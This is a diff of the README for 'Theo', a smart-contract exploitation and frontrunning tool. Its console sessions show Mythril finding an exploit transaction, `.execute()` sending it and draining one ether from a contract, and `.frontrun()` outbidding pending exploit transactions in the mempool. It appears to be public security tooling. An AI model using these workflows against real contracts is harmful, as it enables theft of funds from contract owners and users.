@@ -1,5 +1,3 @@
-**Readme is obsolete; will be rewritten until 2019-08-31.**
-
 # Theo
 
 Theo aims to be an exploitation framework or a blockchain recon and interaction tool.
@@ -100,77 +98,89 @@ Setup a honeypot, deploy honeypot, wait for attacker, frontrun:
 It's a good idea to check the help screen first.
 
 ```console
-$ python ./theo.py --help
-usage: theo.py [-h] [--rpc-http RPC_HTTP] [--rpc-ws RPC_WS]
-               [--rpc-ipc RPC_IPC] [--account ACCOUNT] [--contract ADDRESS]
-               [--txs {mythril,file}] [--txs-file FILE]
-               {tx-pool}
+$ theo --help
+usage: theo [-h] [--rpc-http RPC_HTTP] [--rpc-ws RPC_WS] [--rpc-ipc RPC_IPC]
+            [--account-pk ACCOUNT_PK] [--contract ADDRESS] [--skip-mythril]
+            [--load-file LOAD_FILE] [--version]
 
 Monitor contracts for balance changes or tx pool.
 
-positional arguments:
-  {tx-pool}             Choose between: balance (not implemented: monitor
-                        contract balance changes), tx-pool (if any
-                        transactions want to call methods).
-
 optional arguments:
   -h, --help            show this help message and exit
-  --contract ADDRESS    Contract to monitor
+  --rpc-http RPC_HTTP   Connect to this HTTP RPC (default:
+                        http://127.0.0.1:8545)
+  --account-pk ACCOUNT_PK
+                        The account's private key (default: None)
+  --contract ADDRESS    Contract to interact with (default: None)
+  --skip-mythril        Skip scanning the contract with Mythril (default:
+                        False)
+  --load-file LOAD_FILE
+                        Load exploit from file (default: )
+  --version             show program's version number and exit
 
-Monitor transaction pool:
-  --rpc-http RPC_HTTP   Connect to this HTTP RPC
-  --rpc-ws RPC_WS       Connect to this WebSockets RPC
-  --rpc-ipc RPC_IPC     Connect to this IPC RPC
-  --account ACCOUNT     Use this account to send transactions from
-
-Transactions to wait for:
-  --txs {mythril,file}  Choose between: mythril (find transactions
-                        automatically with mythril), file (use the
-                        transactions specified in a JSON file).
-  --txs-file FILE       The file which contains the transactions to frontrun
+RPC connections:
+  --rpc-ws RPC_WS       Connect to this WebSockets RPC (default: None)
+  --rpc-ipc RPC_IPC     Connect to this IPC RPC (default: None)
 ```
 
 ### Symbolic execution
 
-A list of expoits is automatically identified using [mythril](https://github.com/ConsenSys/mythril).
+A list of exploits is automatically identified using [mythril](https://github.com/ConsenSys/mythril).
 
 Start a session by running:
 
 ```console
-$ python ./theo.py tx-pool --account=<your unlocked account> --contract=<honeypot>
+$ theo --contract=<scanned contract> --account-pk=<your private key>
+Scanning for exploits in contract: 0xa586074fa4fe3e546a132a16238abe37951d41fe
+Connecting to HTTP: http://127.0.0.1:8545.
+Found exploits(s):
+ [Exploit: (txs=[Transaction {Data: 0xcf7a8965, Value: 1000000000000000000}])]
+
+A few objects are available in the console:
+- `exploits` is an array of loaded exploits found by Mythril or read from a file
+- `w3` an initialized instance of web3py for the provided HTTP RPC endpoint
+
+Check the readme for more info:
+https://github.com/cleanunicorn/theo
+
+>>> 
 ```
 
 It will analyze the contract and will find a list of available exploits.
 
-```console
-$ python theo.py tx-pool --account=0xffcf8fdee72ac11b5c542428b35eef5769c409f0 --contract=0xd833215cbcc3f914bd1c9ece3ee7bf8b14f841bb                                          
-Scanning for exploits in contract: 0xd833215cbcc3f914bd1c9ece3ee7bf8b14f841bb
-Found exploit(s) [Exploit: (txs=[Transaction: {'input': '0xcf7a8965', 'value': '0xde0b6b3a7640000'}])]
-Python 3.7.3 (default, Jun 24 2019, 04:54:02) 
-[GCC 9.1.0] on linux
-Type "help", "copyright", "credits" or "license" for more information.
-(InteractiveConsole)
->>>
-```
-
-You can see the available exploits found. In this case one exploit was found. Each exploit is an [Exploit](https://github.com/cleanunicorn/theo/blob/263dc9f0cd34c4a0904529128c93f30b29eae415/theo/scanner/__init__.py#L9) object, having a list of transactions to exploit a bug.
+You can see the available exploits found. In this case one exploit was found. Each exploit is an [Exploit](https://github.com/cleanunicorn/theo/blob/master/theo/exploit/exploit.py) object.
 
 ```console
 >>> exploits[0]
 Exploit: (txs=[Transaction: {'input': '0xcf7a8965', 'value': '0xde0b6b3a7640000'}])
 ```
 
-You can start the frontrunning monitor to listen for other hackers (script kiddies really) trying to exploit his honeypots.
+### Running exploits
 
-Use `.frontrun()` to start listening for the exploit and when found send a transaction with a higher gas price.
+The exploit steps can be run by calling `.execute()` on the exploit object. The transactions will be signed and sent to the node you're connected to.
+
+```console
+>>> exploits[0].execute()
+2019-07-22 11:26:12,196 - Sending tx: {'to': '0xA586074FA4Fe3E546A132a16238abe37951D41fE', 'gasPrice': 1, 'gas': 30521, 'value': 1000000000000000000, 'data': '0xcf7a8965', 'nonce': 47} 
+2019-07-22 11:26:12,200 - Waiting for 0x41b489c78f654cab0b0451fc573010ddb20ee6437cdbf5098b6b03ee1936c33c to be mined... 
+2019-07-22 11:26:16,337 - Mined 
+2019-07-22 11:26:16,341 - Initial balance:      1155999450759997797167 (1156.00 ether) 
+2019-07-22 11:26:16,342 - Final balance:        1156999450759997768901 (1157.00 ether) 
+```
+
+### Frontrunning
+
+You can start the frontrunning monitor to listen for other hackers trying to exploit the honeypot.
+
+Use `.frontrun()` to start listening for the exploit and when found, send a transaction with a higher gas price.
 
 ```console
 >>> exploits[0].frontrun()
-Waiting for a victim to reach into the honey jar.
-Listening for Transaction: {'input': '0xcf7a8965', 'value': '0xde0b6b3a7640000'}.
-Found pending tx: 0x74eb78557b4659f27e7a8b82804ae97be9d0adfefd6a5652a097045f6de77a0b from: 0x1df62f291b2e969fb0849d99d9ce41e2f137006e.
-Frontrunning with tx: {'from': '0xffcf8fdee72ac11b5c542428b35eef5769c409f0', 'to': '0xd833215cbcc3f914bd1c9ece3ee7bf8b14f841bb', 'gasPrice': '0x3b9aca01', 'input': '0xcf7a8965', 'gas': '0x4c4b40', 'value': '0xde0b6b3a7640000'}
-Mined transaction: 0x0b5e7ceedd600eaf013ca8bc74900e6d29b25ed422baaa776f42bec01870a288
+2019-07-22 11:22:26,285 - Scanning the mem pool for transactions... 
+2019-07-22 11:22:45,369 - Found tx: 0xf6041abe6e547cea93e80a451fdf53e6bdae67820244246fde44098f91ce1c20 
+2019-07-22 11:22:45,375 - Sending tx: {'to': '0xA586074FA4Fe3E546A132a16238abe37951D41fE', 'gasPrice': '0x2', 'data': '0xcf7a8965', 'gas': 30522, 'value': 1000000000000000000, 'nonce': 45} 
+2019-07-22 11:22:45,380 - Waiting for 0xa73316daf806e7eef83d09e467c32ce5faa239c6eda3a270a8ce7a7aae48fb7e to be mined... 
+2019-07-22 11:22:56,852 - Mined 
 ```
 
 > "Oh, my God! The quarterback is toast!"
@@ -205,18 +215,6 @@ Create a file that looks like this [input-tx.json](./test/input-tx.json):
 ```
 
 This one defines 2 exploits, the first one has 2 transactions and the second one only 1 transaction. After the exploits are loaded, frontrunning is the same.
-
-```console
-$ python ./theo.py --txs=file --contract=0xe78a0f7e598cc8b0bb87894b0f60dd2a88d6a8ab --account=0xffcf8fdee72ac11b5c542428b35eef5769c409f0 --txs-file=./test/input-tx.json tx-pool     130 ↵
-Found exploits(s) [Exploit: (txs=[Transaction: {'input': '0x4e71e0c8', 'value': '0xde0b6b3a7640000'}, Transaction: {'input': '0x2e64cec1', 'value': '0x0'}]), Exploit: (txs=[Transaction: {'input': '0x4e71e0c8', 'value': '0xde0b6b3a7640000'}])]
-Python 3.7.3 (default, Jun 24 2019, 04:54:02) 
-[GCC 9.1.0] on linux
-Type "help", "copyright", "credits" or "license" for more information.
-(InteractiveConsole)
->>> exploits[0].frontrun()
-Waiting for a victim to reach into the honey jar.
-Listening for Transaction: {'input': '0x4e71e0c8', 'value': '0xde0b6b3a7640000'}.
-```
 
 # Troubleshooting
 
